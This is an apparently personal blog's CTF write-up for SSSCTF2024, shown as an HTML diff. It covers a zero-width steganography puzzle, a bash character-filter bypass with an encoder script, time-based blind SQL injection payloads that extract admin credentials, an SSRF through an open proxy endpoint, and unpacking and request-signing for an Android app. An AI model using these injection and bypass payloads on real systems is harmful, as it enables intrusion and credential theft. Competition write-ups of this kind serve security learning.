@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            SSSCTFwp-Dyinglight
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">SSSCTFwp-Dyinglight</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-04-27
+                        </span>
+                        
+                            
+                                <span id="/article/862536289/" class="leancloud_visitors" data-flag-title="SSSCTFwp-Dyinglight">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                            
+                                <span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/862536289/"></span>
+                                </span>
+                              
+                        
+                    </p>
+                    
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="SSSCTF2024-wp-Dyinglight"><a href="#SSSCTF2024-wp-Dyinglight" class="headerlink" title="SSSCTF2024 wp -Dyinglight"></a>SSSCTF2024 wp -Dyinglight</h1><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="原神"><a href="#原神" class="headerlink" title="原神"></a>原神</h3><p>flag{yuanshenqidong} 蒙德文字</p>
+<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h3><p>ida进去就能看到flag</p>
+<p><img src="/../images/sssctf/QQ%E6%88%AA%E5%9B%BE20240427091501.png"></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-ravenfield"><a href="#1-ravenfield" class="headerlink" title="1.ravenfield"></a>1.ravenfield</h3><p><img src="/../images/sssctf/2.png"></p>
+<p>﻿‎下载了个编码的插件，发现utf-8编码会显示you win，但是源代码中间空了很多点点，把这些点点复制到浏览器，发现了这篇文章</p>
+<p>﻿‏<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38805084/article/details/102682864">https://blog.csdn.net/qq_38805084/article/details/102682864</a></p>
+<p>0‍‍宽字节隐写，﻿<a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/%E8%BF%99%E4%B8%AA%E2%80%8C%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%8A%8Ayou">https://yuanfux.github.io/zero-width-web/这个‌网站可以解密，把you</a> win复制进来解密即可</p>
+<p>﻿‎‍﻿﻿‍﻿‎<img src="/../images/sssctf/3.png">‏‍﻿‌‌‎‍﻿﻿‏‍﻿‎﻿‍﻿﻿‎‏‌‎﻿‍﻿‎﻿‏‏‌‎‍‍﻿‎﻿‎‍‌‌﻿﻿‏﻿﻿‎‏‏‎‎</p>
+<p>ps:游戏真好玩)</p>
+<h3 id="2-weirdbash-复现"><a href="#2-weirdbash-复现" class="headerlink" title="2.weirdbash(复现)"></a>2.weirdbash(复现)</h3><p>dutctf获得一长串提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*+-!?$%&amp;*</span><br><span class="line">noob-noob?noob-noob!noob$noob%noob-noob!noob%noob*noob-noob!noob*noob-noob!noob?noob&amp;noob*noob-noob!noob%noob*noob!noob-noob!noob%noob&amp;noob*noob-noob!noob$noob%noob&amp;noob*noob!noob-noob!noob?noob%noob-noob!noob$noob%noob&amp;noob*noob!noob-noob!noob?noob%noob-noob!noob$noob-noob!noob%noob*noob!noob!noob&amp;noob!noob$noob%noob&amp;noob*noob-noob!noob$noob%noob&amp;noob-noob!noob$noob%noob&amp;noob*noob-noob!noob$noob%noob&amp;noob*noob-noob!noob&amp;noob!noob&amp;noob!noob-noob!noob?noob&amp;noob-noob!noob$noob%noob&amp;noob*noob-noob!noob?noob%noob*noob-noob!noob?noob%noob-noob!noob%noob*noob!noob-noob!noob?noob%noob-noob!noob$noob%noob&amp;noob*noob!noob-noob!noob&amp;noob*noob-noob!noob*noob-noob!noob?noob-noob!noob?noob%noob-noob!noob?noob%noob*noob-noob!noob?noob&amp;noob-noob!noob%noob*noob!noob-noob!noob?noob%noob-noob!noob$noob-noob!noob%noob*noob!noob-noob!noob%noob&amp;noob-noob!noob$noob%noob-noob!noob*noob-noob!noob%noob&amp;noob*noob!noob$noob%noob&amp;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+-!? $%&amp;* 是标准顺序1111 1111</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">noob_encode</span>(<span class="params">input_string</span>):</span><br><span class="line">    encodeed_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> input_string:</span><br><span class="line">        ascii_value = <span class="built_in">ord</span>(char)</span><br><span class="line">        binary_representation = <span class="string">&#x27;&#123;0:08b&#125;&#x27;</span>.<span class="built_in">format</span>(ascii_value)</span><br><span class="line">        encodeed_char = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> bit, operator <span class="keyword">in</span> <span class="built_in">zip</span>(binary_representation, [<span class="string">&#x27;noob+&#x27;</span>, <span class="string">&#x27;noob-&#x27;</span>, <span class="string">&#x27;noob!&#x27;</span>, <span class="string">&#x27;noob?&#x27;</span>, <span class="string">&#x27;noob$&#x27;</span>, <span class="string">&#x27;noob%&#x27;</span>, <span class="string">&#x27;noob&amp;&#x27;</span>, <span class="string">&#x27;noob*&#x27;</span>]):</span><br><span class="line">            <span class="keyword">if</span> bit == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                encodeed_char += operator</span><br><span class="line">        encodeed_string += encodeed_char</span><br><span class="line">    <span class="keyword">return</span> encodeed_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">noob_decode</span>(<span class="params">encodeed_string</span>):</span><br><span class="line">    decodeed_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(encodeed_string):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            check_valid_noob_string(encodeed_string[i:])</span><br><span class="line">            decodeed_char = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> operator <span class="keyword">in</span> [<span class="string">&#x27;noob+&#x27;</span>, <span class="string">&#x27;noob-&#x27;</span>, <span class="string">&#x27;noob!&#x27;</span>, <span class="string">&#x27;noob?&#x27;</span>, <span class="string">&#x27;noob$&#x27;</span>, <span class="string">&#x27;noob%&#x27;</span>, <span class="string">&#x27;noob&amp;&#x27;</span>, <span class="string">&#x27;noob*&#x27;</span>]:</span><br><span class="line">                <span class="keyword">if</span> encodeed_string.startswith(operator, i):</span><br><span class="line">                    decodeed_char += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                    i += <span class="built_in">len</span>(operator)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    decodeed_char += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            ascii_value = <span class="built_in">int</span>(decodeed_char, <span class="number">2</span>)  <span class="comment"># 转换为2进制</span></span><br><span class="line">            decodeed_string += <span class="built_in">chr</span>(ascii_value)</span><br><span class="line">        <span class="keyword">except</span> DecodeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">raise</span> DecodeError</span><br><span class="line">    <span class="keyword">return</span> decodeed_string</span><br></pre></td></tr></table></figure>
+
+<p>根据完整的加解密代码，逻辑是先把字符串ascii转化为八位二进制(例如0000 0000)，然后分别用<code>&#39;noob+&#39;, &#39;noob-&#39;, &#39;noob!&#39;, &#39;noob?&#39;, &#39;noob$&#39;, &#39;noob%&#39;, &#39;noob&amp;&#39;, &#39;noob*&#39;</code>去替换这八个数字中的1，得到加密的字符串</p>
+<p>解密的逻辑就是把noob串遍历，有对应的字符就加1，没有就加0，得到二进制串，再翻译为ascii码即可</p>
+<p>解密后的结果为：Please go to the “&#x2F;noob” route to capture the flag.</p>
+<p>进入&#x2F;noob路由，经过测试过滤了所有的字母数字，还有&amp;,&#x3D;,~,_</p>
+<p><img src="/../images/sssctf/bash%E8%BF%87%E6%BB%A4.PNG"></p>
+<p>自己做题的时候一直在用异或绕过的方向，但是命令似乎并不会被解析</p>
+<p>利用脚本绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> cmdx <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>((<span class="built_in">oct</span>(<span class="built_in">ord</span>(cmdx)))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span></span><br><span class="line">    ct = <span class="built_in">str</span>.replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ct = <span class="string">&#x27;$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span> + ct + <span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line">    charset = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> ctx <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">if</span> ctx.isprintable() <span class="keyword">and</span> ctx <span class="keyword">not</span> <span class="keyword">in</span> charset:</span><br><span class="line">            charset.add(ctx)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc(<span class="string">&quot;cat /flag&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><code>$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\&lt;\&lt;\&lt;\$\&#39;\\$(($(($&lt;&lt;$))#$$$$$$))\\$(($(($&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$$$&lt;&lt;$))#$$$$$$&lt;&lt;$))#$$$$$))\\$(($(($&lt;&lt;$))#$$$$$$))\&#39;</code></p>
+<p>加密成noob再执行即可(多等会儿)</p>
+<p>本质上是利用$#进行构造，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EH4iuPNbmxG=DuYD&alichlgref=https://cn.bing.com/#toc-0">参考文章</a></p>
+<h3 id="3-app-没做出来"><a href="#3-app-没做出来" class="headerlink" title="3.app(没做出来)"></a>3.app(没做出来)</h3><p>扫描到config：{“key”:”quOKHlGWut9iJUFvDi0CoKwqN1dw0z4zsul5IGdvvpc&#x3D;”,”iv”:”nsmz&#x2F;N5vMhnUaF&#x2F;hSvAP8w&#x3D;&#x3D;”}</p>
+<p>gallery:[{“id”:1,”url”:”&#x2F;img&#x2F;1.jpg”},{“id”:2,”url”:”&#x2F;img&#x2F;2.jpg”},{“id”:3,”url”:”&#x2F;img&#x2F;3.png”}]</p>
+<h3 id="4-gpt-复现"><a href="#4-gpt-复现" class="headerlink" title="4.gpt(复现)"></a>4.gpt(复现)</h3><p>首先是sql时间盲注入，<code>username=1&amp;password=1&#39;+||+if(ascii(substr(database(),1))=115,sleep(2),1)%23</code></p>
+<p>注出数据库名为sssctf2024_db</p>
+<p>由于or被ban了，用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_flattened_keys</span><br><span class="line">schema_auto_increment_columns#该视图的作用简单来说就是用来对表自增ID的监控,可以通过该视图获取数据库的表名信息。</span><br><span class="line">schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer<span class="operator">/</span><span class="operator">/</span>没有自增数据</span><br><span class="line">mysql.innodb_table_stats、mysql.innodb_table_index</span><br></pre></td></tr></table></figure>
+
+<p>可以替换information_schema，得到表名<code>sssctf2024_users</code>(这些表没有列名)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+||+if(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=&#x27;</span>sssctf2024_db<span class="string">&#x27; limit 0,1),1))=115,sleep(5),0)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>查列名，可以使用无列名注入</p>
+<p><code>select 1,2,3  union select * from sssctf2024_users</code>会产生一个虚拟表(必须保证列数正确)</p>
+<p>只要给虚拟表取一个别名n，即可查询其中的数据，下面查询了第二列的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 反引号<span class="number">2</span>反引号 <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>
+
+<p>在反引号被过滤时还可以使用给列起别名的方式查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>
+
+<p>还可以使用<code>表名.列名</code>这种形式，n是我们给虚拟表起的别名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> n<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)n;</span><br></pre></td></tr></table></figure>
+
+<p>故可以用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+||+if(ascii(substr((select n.2 from (select 1,2,3 union select * from sssctf2024_users)n limit 0,1),1))=115,sleep(5),0)%23</span></span><br></pre></td></tr></table></figure>
+
+<p>查到列名为username,password，注出数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;+||+if(ascii(substr((select username from sssctf2024_db.sssctf2024_users limit 0,1),1))=115,sleep(5),0)%23</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Scr1w_admin,sssctf2024_P@ssvv0rd</span><br></pre></td></tr></table></figure>
+
+<p>登陆进去发现</p>
+<p><img src="/../images/sssctf/gpt.png"></p>
+<p>flag生成的是假的，next-gpt能搜索到一个ssrf漏洞</p>
+<p>但是，有一些暴露的服务器端点。其中一个端点位于&#x2F;API&#x2F;cors，它的功能设计为开放代理，允许未经身份验证的用户通过它发送任意HTTP请求。添加此端点似乎是为了支持将客户端聊天数据保存到WebDAV服务器。此端点的存在是一种反模式：它允许客户端绕过内置的浏览器保护，通过服务器端端点访问跨域资源。</p>
+<p>于是访问<a target="_blank" rel="noopener" href="http://210.30.97.133:10181/api/cors/http/scr1wgpt-web/generator%E5%8D%B3%E5%8F%AF%E6%8B%BF%E5%88%B0%E7%9C%9F%E6%AD%A3%E7%9A%84flag">http://210.30.97.133:10181/api/cors/http/scr1wgpt-web/generator即可拿到真正的flag</a></p>
+<h3 id="5-app"><a href="#5-app" class="headerlink" title="5.app"></a>5.app</h3><p><img src="/../images/sssctf/app-1.png"></p>
+<p>360加固，用frida-dexdump脱壳</p>
+<p>前台模拟器挂着app，开启adb中的frida</p>
+<p><img src="/../images/sssctf/7.png" alt="!(../images/sssctf/6.png)"></p>
+<p><img src="/../images/sssctf/8.png"></p>
+<p>生成了一个文件夹，把里面的dex文件拖入jadx</p>
+<p><img src="/../images/sssctf/9.png"></p>
+<p>再用fiddler抓包,抓到config的包</p>
+<p><img src="/../images/sssctf/10.png"></p>
+<p>{“key”:”khcYuxRprjYyRVY71OK6RLSi2jn2ljd7vkm+VqDAgRk&#x3D;”,”iv”:”bhT3FXFaimOl80uvAk92+A&#x3D;&#x3D;”}</p>
+<p><img src="/../images/sssctf/11.png"></p>
+<p>点击个人信息抓到这个包，直接访问<a target="_blank" rel="noopener" href="http://210.30.97.133:10055/service/m/app/info?uid=-1">http://210.30.97.133:10055/service/m/app/info?uid=-1</a></p>
+<p><img src="/../images/sssctf/12.png"></p>
+<p>得知访问数据是要签名的，签名需要config里的key和iv，用java签名的AES加密，发包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;khcYuxRprjYyRVY71OK6RLSi2jn2ljd7vkm+VqDAgRk=&quot;</span>; <span class="comment">// 替换为你的key</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">iv</span> <span class="operator">=</span> <span class="string">&quot;bhT3FXFaimOl80uvAk92+A==&quot;</span>; <span class="comment">// 替换为你的iv</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;uid=20&amp;timestamp=1&amp;a=2&amp;nonce=3&quot;</span>; <span class="comment">// 替换为你的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(Base64.getDecoder().decode(key), <span class="string">&quot;AES&quot;</span>), <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(Base64.getDecoder().decode(iv)));</span><br><span class="line">        <span class="type">byte</span>[] encrypted = cipher.doFinal(data.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] digest = md.digest(encrypted);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : digest) &#123;</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sign</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">        System.out.println(<span class="string">&quot;Generated sign: &quot;</span> + sign);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sssctf/14.png"></p>
+<p>做到这里发现uid是无法直接访问其他数据的，看了wp上通过逆向分析可以发现rank路由</p>
+<p><img src="/../images/sssctf/15.png"></p>
+<p>拿到数据，发现最后一条数据<code>&#123;&quot;id&quot;:6660,&quot;institute&quot;:&quot;DUTCTF&quot;,&quot;name&quot;:&quot;福来阁&quot;,&quot;points&quot;:40&#125;</code></p>
+<p>这里可以猜测是visitor的问题，根据逆向的代码(这里直接贴wp的图片了，自己太菜审计不出来)，得知有个isVisitor参数</p>
+<p><img src="/../images/sssctf/16.png"></p>
+<p>构造url访问，记得这里的签名也要加上isVisitor</p>
+<p><img src="/../images/sssctf/17.png"></p>
+<p>千辛万苦终于拿到flag了</p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/RL02.jpg" alt="Dyinglight">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>Dyinglight
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/article/862536289/" target="_blank">SSSCTFwp-Dyinglight</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>原神,启动！
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/article/479963934/" class="prev-prefix">« </a> 上一篇：    <a href="/article/479963934/" title="发布于 2024-05-01 10:51">ISCC-wp-dyinglight</a>
+                        <br>
+                    
+                    
+                        <a href="/article/1615743781/" class="next-prefix">» </a> 下一篇：    <a href="/article/1615743781/" title="发布于 2024-04-17 04:03">php命令执行</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+    
+ 
+        </div>
+    
+</div>
+    <div id="footer">
+    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>
+</div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>ctf start！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/RL02.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user">
+                        
+                            <a href="https://worstone.cn" target="_blank"><span>Dyinglight</span></a>
+                        
+                    </div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://zhihu.com/people/worstone-29" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://weibo.com/u/5749847477" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.jpg"><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="微信" href="javascript:;" class="" target="_self" data=""><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/Dyinglight5" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
